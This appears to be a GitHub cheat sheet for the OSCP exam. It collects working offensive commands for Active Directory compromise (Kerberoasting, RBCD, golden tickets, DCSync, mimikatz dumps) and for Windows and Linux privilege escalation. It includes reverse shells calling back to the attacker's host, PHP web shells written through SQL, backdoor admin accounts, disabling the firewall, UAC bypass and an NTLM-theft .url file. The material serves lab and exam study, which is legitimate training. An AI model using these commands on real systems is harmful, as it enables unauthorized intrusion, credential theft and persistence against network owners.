# OSCP
Kullaisec - Just for simplicity and fastness

[[Windows PG](https://kullaisec.github.io/OSCP/oscp-windows-pg.ctb.pdf)]

[[Linux PG](https://kullaisec.github.io/OSCP/oscp-linux-pg.ctb.pdf)]

[[AD PG](https://kullaisec.github.io/OSCP/oscp-AD-pg.ctb.pdf)]

## Commands 

### AD
.NET :

whoami

hostname

Enum Local users:
```
net users
```
Enum Domain users:
```
net users /domain
```
Enum Domain Groups:
```
net groups /domain 
```
Enum Local Groups:
```
net localgroup
```
Enum Local Group member:
```
net localgroup <group-name>
```
Enum Users of Domain group:
```
net group "<Group-Name>" /domain
```

#### PowerView.ps1:
```
Import-Module .\PowerView.ps1
```
Domain Controller details:
```
Get-DomainController
```
Enum Total Computers on domain:
```
Get-DomainComputer | select samaccountname , name
```

Enum users and their groups in Domain:
```
Get-DomainUser | select name,memberof
```
Enum Groups and their members:
```
Get-DomainGroup | select name, member
```
Enum Particular Group recursively !!
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
Enum loggedin Users in Local Computer:
```
Get-NetLoggedon | select username
```
**Imp: Run this command in every machine !! And with every server name  **
```
PS> Get-NetLoggedon -Computername DC01
```
```
PS> Get-NetLoggedon -Computername <servername>
```
#### Enum active sessions on the host:
```
PS> Get-NetSession
```
```
PS> Get-NetSession -Computername <servername>
```
#### Command: 
```
Invoke-UserHunter -CheckAccess
```
1. Get Domain Admins members 
2. Get list of Computers 
3. Get-netloggedon and get-netsession on each computers 
3. Get-netloggedon and get-netsession on each computers 
4. Search if there is a Active Domain Admins session in any Computers. 
5. See if your user id a local admin on the machine that have the DA session  

Finding IP of particular servers:
```
nslookup dc01
```
```
nslookup <server_name>
```
### Add User to Domain and a Group
```powershell
PS> net user kullai kali@116 /add /domain

PS> net group "Group name" /add kullai
```
#### Enumerate the SPN's and do kerberosting: [hashcat : -m 13100]
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
Import the **Invoke-Kerberost.ps1** from our kali.. 

```
Import-Module .\Invoke-Kerberost.ps1
```

```
PS> Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\users\public\HashCapture.txt' -Width 8000
```

#### Kerberosting:
```
# impacket-GetUserSPNs -request -dc-ip <DC-IP> oscp.lab/username
```
hashcat mode: 13100

Windows:
```
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
Linux:
```
# sudo impacket-GetUserSPNs -request -dc-ip 192.168.237.70 corp.com/pete
```
```
# python3 /home/kali/offsec/AD/tools/Tools/GetUserSPNs.py -dc-ip 192.168.238.70 -request -outputfile hashes.capstone2 corp.com/meg
```
→ Hashcat:
```
# sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
#### As-Reproasting :
```
# impacket-GetNPUsers oscp.lab/username -outfile wsername.hash
```
We need to add $23$ to the hash like:

![image](https://github.com/kullaisec/OSCP/assets/99985908/94a9550e-6d4a-4a96-80fb-9e1e4570cfd7)

Linux:
```
# impacket-GetNPUsers -dc-ip 192.168.225.70  -request -outputfile hashes.asreproast corp.com/pete
```
for this mostly we use the hashcat mode as 18200

Windows:
```
PS C:\Tools> .\Rubeus.exe asreproast
```
```
PS C:\Tools> .\Rubeus.exe asreproast /nowrap
```
→ Hashcat
```
# sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### GenericAll Permission on Domain Controller [ DC ]:

Like this : 

![image](https://github.com/kullaisec/OSCP/assets/99985908/109df214-c1d4-483a-a183-f0b8ca91866c)

```
# impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.161.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'hacker$' -computer-pass 'l9z3JiITmvqcwdq'
```
```
PS > get-adcomputer hacker
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/1eef77ea-dbd6-4a20-89a8-0c1d01d3ed69)

https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py

With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of rbcd.py and use it to set **msDS-AllowedToActOnBehalfOfOtherIdentity** on our new machine account.

```
# python3 rbcd.py -dc-ip 192.168.161.175 -t RESOURCEDC -f 'hacker' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
```
```
PS> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/90d4f7b8-d613-43ae-8c3a-64adb43f3754)

We now need to get the administrator service ticket. We can do this by using impacket-getST with our privileged machine account.

```
# impacket-getST -spn cifs/resourcedc.resourced.local resourced/hacker\$:'l9z3JiITmvqcwdq' -impersonate Administrator -dc-ip 192.168.161.175
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/81fdd1c3-07a3-4712-ad12-533ef3534d73)

This saved the ticket on our Kali host as Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache. We need to export a new environment variable named KRB5CCNAME with the location of this file.

```
# export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

```
# impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.161.175
```

you will get adminsitrator access !!

## Write Owner Privilge:

  We have access to `nico` user and we have WriteOwner Privilege to `Herman` user use command
  
  ```powershell
  Powerview> Set-DomainObjectOwner -Identity 'target_object[nico]' -OwnerIdentity 'controlled_principal[Herman]'
 ```
 And we can also own and reset the `Herman` User password
 
 ```powershell
  Powerview> Add-DomainObjectAcl -TargetIdentity Herman -PrincipleIdentity nico -Rights ResetPassword
 ```

 Now re-run the bloodHound And Now you can see the `nico` user owns and he can change the password of `Herman`

 Now try to change the `Herman` user password !!
 
 ```powershell

  $pass = ConvertTo-SecureString 'Password@123' -AsPlainText -Force

  SetDomainUserPassword Herman -AccountPassword $pass -Verbose
```

 Now the `Herman` is a user and he have `GenericAll` permissions on `BackUp Admins Group` Let's Add Herman to Backup Admins Group!!
 
 ```
 PS> Get-DomainGroup -MemberIdentity Herman | select samaccountname
```
We already have the password ($pass) so start with the other commands !!
```powershell
   PS> $cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
   PS> Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
   PS> Get-DomainGroup -MemberIdentity Herman | select samaccountname
```
   Now we `Herman` is part of `Backup_Admins`!!

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

## Golden Ticket !!

We have kgbre hash !! [From Linux]

`-domain-sid` --> 
```powrshell
Get-ADDomain htb.local
```
```powershell
# python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain htb.local  <user_name [Anything or administrator]>

# export KRB5CCNAME=<TGS_ccache_file>
```
```powershell
# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

### SMB to NTLM Theft

Create a offsec.url as below

```bash
[InternetShortcut]
URL=anything
WordkingDirectory=anything
IconFile=\\KALI-IP\%USERNAME%.icon
IconIndex=1
```
Just Upload via SMB CLIENT and listen via Responder you will get the NTLM Hash !!



### LAPS:

![image](https://github.com/kullaisec/OSCP/assets/99985908/db596238-7457-4ce9-a9aa-34c49057aa47)

![image](https://github.com/kullaisec/OSCP/assets/99985908/81dec7e5-1334-4009-8ae6-412b2943ec6a)

```
# netexec ldap 192.168.225.122 -u username -p password --kdcHost HUTCHDC[see image] -M laps
```




#### Search anywhere file in windows:
```
> dir /s/b \local.txt
```
```
PS> Get-ChildItem -Path C:\ -Recurse -Filter *.log
```

#### Powershell History:
```
PS C:\Users\adrian> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
#### If you have access as local admin in any windows system try to enable RDP

first create any user and add him to localadmin group
```
> net user /add backdoor Password123
```
```
> net localgroup administrators /add backdoor
```
#### Enable RDP Registry command !!
```
> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
```
#### Disable Firewall:
```
> netsh advfirewall set allprofiles state off
```
### Mimikatz:
```
.\mimikatz.exe
```
```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # log
```
→ To dump the credentials of all logged-on users
```
mimikatz # sekurlsa::logonpasswords
```
```
mimikatz# lsadump::lsa /inject
```

→ Show the tickets that are stored in memory
```
mimikatz # sekurlsa::tickets
```

### Domain Synchronization:

→ lsadump::dcsync module and provide the domain username for which we want to obtain credentials as an argument for /user
```
mimikatz # lsadump::dcsync /user:corp\dave
```
```
mimikatz # lsadump::dcsync /user:corp\Administrator
```

### Crackmapexec:

for bruteforcing:
```
# crackmapexec smb 192.168.225.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

For checking if the pwned is reflected then that user is local admin on that system !!
```
# crackmapexec smb 192.168.225.75 -u dave -p 'Flowers1' -d corp.com
```

## Files Transfers:

1) SMB: 
On Kali:
```
impacket-smbserver test . -smb2support  -username kali -password kali
```
On Windows:
```
net use m: \\Kali_IP\test /user:kali kali
```
```
copy mimikatz.log m:\
```

2) RDP mounting shared folder:
Using xfreerdp:
On Kali:
```
xfreerdp /cert-ignore /compression /auto-reconnect /u:offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,.
```
On windows:
```
copy mimikatz.log \\tsclient\test\mimikatz.log
```
Using rdesktop:
On Kali:
```
rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200
```

On Windows:
```
copy mimikatz.log \\tsclient\test\mimikatz.log
```

3) Impacket tools:
psexec and wmiexec are shipped with built in feature for file transfer.
Note: By default whether you upload (lput) or download (lget) a file, it'll be writte in C:\Windows path.
Uploading mimikatz.exe to the target machine:
```
C:\Windows\system32> lput mimikatz.exe
[*] Uploading mimikatz.exe to ADMIN$\/
C:\Windows\system32> cd C:\windows
C:\Windows> dir /b mimikatz.exe
mimikatz.exe
```
Downloading mimikatz.log:
```
C:\Windows> lget mimikatz.log
[*] Downloading ADMIN$\mimikatz.log
```
4) Evil-winrm:
Uploading files:
```
upload mimikatz.exe C:\windows\tasks\mimikatz.exe
```
Downloading files:
```
download mimikatz.log /home/kali/Documents/pen-200
```
5) C2 frameworks:
Almost any of the C2 frameworks such as Metasploit are shipped with downloading and uploading functionality.

6) In FTP, binaries in ASCII mode will make the file not executable. Set the mode to binary.

Additional Resources:

File Transfer:  https://www.youtube.com/watch?v=kd0sZWI6Blc

PEN-100: https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100/books-and-videos/modal/modules/file-transfers

## Windows Environment Set :
See this make Windows shell looks good !!

Path: 
```
/home/kali/Tib-Priv/Win/tools/Invoke-ConPtyShell.ps1
```
https://github.com/antonioCoco/ConPtyShell

## Windows Phpmyadmin Reverse shell:

Github Link: https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f

```sql
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```
## Windows php Reverse shell:

Github Link : https://github.com/Dhayalanb/windows-php-reverse-shell

or 

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
```



## Windows PrivEsc:

Automation:
```
PS> . .\PowerUp.ps1
```
```
PS> Invoke-AllChecks
```

Enumeration Tool [May give Privesc results]

https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe 
```
PS> .\Seatbelt.exe all
```
**WinPeas:**

https://github.com/peass-ng/PEASS-ng/ >> Download only latest to get more accurate results!

Run a registry command to enable the colors if you are using GUI windows!
```
> reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```
close the cmd and reopen 
```
> .\winPeas.exe
```
Service Commands:
```
> sc.exe qc <name>
```
```
> sc.exe query
```
```
> sc.exe query <name>
```

Modify a configuration option of a service:
```
> sc.exe config <name> <option>= <value>
```

Start/Stop a service:
```
> net start/stop <name>
```

### SeImpersonate:

```powershell
PS> .\PrintSpoofer64.exe -i -c powershell.exe
```
```powershell
C:\> .\GodPotato.exe -cmd "C:\Users\Public\nc.exe KALI_IP PORT -e cmd"
```
```powershell
PS> .\SweetPotato.exe -a whoami
```
```powershell
PS> .\SweetPotato.exe -p shell.exe
```

## Windows Path Setting

Sometims when you enter `whoami` command then it is not recognized by the Windows!!

```
C:\Users\Public> whoami

Error: 'whoami' is not recognized as an internal or external command operable program or batch file.

```

#### Solution:

```
C:\Users\Public> set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\dotnet\
```


### Insecure Service Permissions
```
> .\winPEASany.exe quiet servicesinfo
```
Example:
Just ran the Winpeas !!

![image](https://github.com/kullaisec/OSCP/assets/99985908/437b6de4-78d8-4751-b087-057516123b38)

![image](https://github.com/kullaisec/OSCP/assets/99985908/e5ade749-a000-4c75-845b-6c40cb82c4c5)

![image](https://github.com/kullaisec/OSCP/assets/99985908/9614e16e-09cb-427a-b1f8-522112e73602)

Confirmed the attack vector 

Now We need to check manually whether we have permissions to overwrite that binary  !!!
```
PS C:\Users\chris\temp> icacls "C:\program files\Kite"
```
```
PS C:\Users\chris\temp> icacls C:\program files\Kite\KiteService.exe
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/3ff026e3-8245-41c7-8df5-7bea6e98239b)

you can see we have Modify access !!

Now let's see the current status of the Service !!
```
PS C:\Users\chris\temp> cmd.exe /c "sc qc KiteService"
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/9c4d2ac8-a8e4-47ac-82a3-82d0787ea32c)

you can see it is Running currently and It will start as Local System [ i.e., Administrative privileges !! ]

So If we replace the KiteService.exe binary with our reverse shell binary with the same name an restart the service then 
we will get the Administrative Shell !!
```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.203 LPORT=8989 -f exe > shell8989.exe
```
Uploaded into the target machine and renamed as ** KiteService.exe** name

and using the powershell we forcefully replaced the original file and stopeed and started the service !!
```
PS> Copy-Item -Path "C:\Users\chris\temp\KiteService.exe" -Destination "C:\program files\Kite\KiteService.exe" -Force
```
```
PS> net stop KiteService
```
```
PS> net start KiteService
```
### Windows Binary PrivEscs:

#### Add Existing User to Local-Admin :

```c
#include <stdlib.h>

int main() {
    int i;
    i = system("net localgroup administrators <username> /add");
    return 0;
}
```
#### Cross Compilation:
```
# x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

#### Add New User as Local Admin and have RDP access
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  i = system ("net localgroup 'Remote Management Users' dave2 /add");
  
  return 0;
}
```
#### Powershell Script that Add user to Local Admin [powershelladduser.ps1]

```powershell
# Add user 'andrea' to the local 'Administrators' group
try {
    Add-LocalGroupMember -Group "Administrators" -Member "andrea"
    Write-Output "User 'andrea' has been added to the Administrators group."
} catch {
    Write-Output "Failed to add user 'andrea' to the Administrators group."
}
```

### Unquoted Service Path

**Powershell**

```powershell
PS C:> Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

**Command Prompt:**

```
C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

### DLL Hijacking

Read OSCP Notes !!

### Powershell History

```powershell
PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
```

Displayes the Powershell History files of `Dave` User

### Shedule Tasks

**Command Prompt:**

```
C:\> schtasks /query /fo LIST /v
```

**Powershell**

```powershell
PS > Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
If you see any binary you have full access or Modify permissions then replace it and wait for some time to get the elevated shell !!

### AlwaysInstallElevated

Upload any malicious .msi file and run that and get the system level access !!

```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi -o reverse.msi
```

**Target system: **
```
PS C:\Users\Public\temp> msiexec /quiet /qn /i C:\Users\Public\temp\reverse.msi
```
Listen on 443 and get the Elevated Shell

### Windows PrivEsc Write Access

Suppose we are have read and write access to the Adminsitrator and we can alos read the Proof.txt flag but we are unable to get the shell This method will works there !!

Take an example we are `apache` [Low Priv] user and we have `SQL server` on it and that sql server have `Admistrative permissions` and we can Write the Files as `Admins` so Using the diaghub dll method we can get the Shell !!

First Create a Malicious `test.dll` file
```
# msfvenom --platform windows --arch x64 -p windows/x64/shell_reverse_tcp LHOST=tun0 EXICFUNC=THREAD LPORT=443 -f dll -o test.dll
```
Now upload the [diaghub.exe] (https://github.com/xct/diaghub/releases/download/0.1/diaghub.exe) binary to the same location where the test.dll is there !!
looks like :

![image](https://github.com/kullaisec/OSCP/assets/99985908/5c642bf3-4de1-4eb6-83df-6b66c4889dcd)

Now go to the mysql service and try to place the `test.dll` on the `Windows\system32\` path ...

example
```sql
MariaDB [(none)]> select load_file('C:\\\\test\\temp\\test.dll') into dumpfile 'C:\\\\Windows\\System32\\test.dll';
```
you can see we are able to do this now `test.dll` file is in the `System32\` path !!

```
PS C:\test\temp> .\diaghub.exe C:\test\temp test.dll
```

And listen on 443 we will get elevated shell !!

More methods reference : https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#diaghub

### UAC Bypass

Suppose you are part of Administrator Group But you are unable to perform commands as a High Level User then there may be chances of UAC interruption we can bypass that !!

PS> whoami /all   --> Mandatory Label\Medium Mandatory Level


![image](https://github.com/kullaisec/OSCP/assets/99985908/87c89a83-8d16-4a31-98bd-6be51924ce51)

**Exploitation:**

Tool Github Link:  https://github.com/CsEnox/EventViewer-UACBypass

On target System: 

```powershell
PS > Import-Module .\Invoke-EventViewer.ps1
PS > Invoke-EventViewer 
[-] Usage: Invoke-EventViewer commandhere
Example: Invoke-EventViewer cmd.exe
```
replace the malicious Bianry and get the Elavted Access by bypassing the UAC !!

```powershell
PS > Invoke-EventViewer C:\Users\Public\temp\reverse.exe
[+] Running
[1] Crafting Payload                                                                         
[2] Writing Payload                                                                          
[+] EventViewer Folder exists                                                                
[3] Finally, invoking eventvwr 
```
After Exploitation:

![image](https://github.com/kullaisec/OSCP/assets/99985908/536fc075-092c-44d8-b8f9-70217e1db1bd)



## Linux PrivEsc:

Linux Environment set:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
```
```
export TERM=xterm-256color
```
```
alias ll='clear ; ls -lsaht --color=auto'
```
Ctrl + Z [Background Process]
```
stty raw -echo ; fg ; reset
```
```
stty columns 200 rows 200
```

### Kernel Exploits:
```
$ uname -a
```

→ Leaks kernel details search for exploits

SUID:
```
$ find / -perm -u=s -type f 2>/dev/null
```
Capabilities:

```
$ /usr/sbin/getcap -r / 2>/dev/null
```
go to gtfobins and exploit !!

Services Exploits:
```
$ ps aux | grep "^root"
```
→ Enumerate the program version:
```
$ <program> --version
$ <program> -v
```
→ Debian:
```
$ dpkg -l | grep <program>
```

Port Forwarding:
```
$ netstat -nl
```
→ if you found any 127.0.0.1 you can access via following command:
```
$ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine> 
```

Weak Permissions:
```
$ ls -al /etc/shadow
```
crack using john :
```
$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
```
$ ls -al /etc/passwd
```
if writable create a new password with the openssl and replace with "x"

→ Backups
```
$ ls -la /home/user
$ ls -la /
$ ls -la /tmp
$ ls -la /var/backups
```
#### always check .ssh folder

SUDO:
```
$ sudo -l
```
Cron:
```
$ cat /etc/crontab
```

## Ligolo Pivoting 

Example Network:


![image](https://github.com/kullaisec/OSCP/assets/99985908/2323c1ef-c63f-4c5e-a4fa-7dc0ae107622)

                      


Follow the commands correctly !!

→ Navigate to /home/kali/offsec/pivote
→ Trasfer the agent.exe file to Windows [target] machine.

Kali:
```
# sudo ip tuntap add user $(whoami) mode tun ligolo
```
```
# sudo ip link set ligolo up
```

You can see the interface ligolo is started !!

Now start the proxy !!!

/home/kali/offsec/pivote

```
# ./proxy -selfcert
```
You can see our ligolo is working  and started at all interfaces on port 11601

Now go to the windows machine [target]
```
PS> .\agent.exe -connect <KALI-IP>:11601 -ignore-cert
```


you will get session like this select session 1
```
[Agent : OFFSEC\jess@CLIENT01] » ifconfig
```
see the internal IP and add route in our kali:
```
# sudo ip route add 172.16.153.0/24 dev ligolo
```
Now go to the proxy ligolo and enter start command
```
[Agent : OFFSEC\jess@CLIENT01] » start
```
We can add the listners to get the reverse shell back or you can trasfer files by adding the listners!!

For File trasfers always use port 80
```
[Agent : OFFSEC\jess@CLIENT01] » listener_add --addr 0.0.0.0:9292 --to 127.0.0.1:80
```
```
[Agent : OFFSEC\jess@CLIENT01] » listener_list
```

Now go to WEB01 machine and enter 
```

WEB01 PS> iwr -uri http://CLEINT01-INTERNAL-172-subnet-IP/filename -Outfile filename
```
```
sudo ip link delete ligolo
```
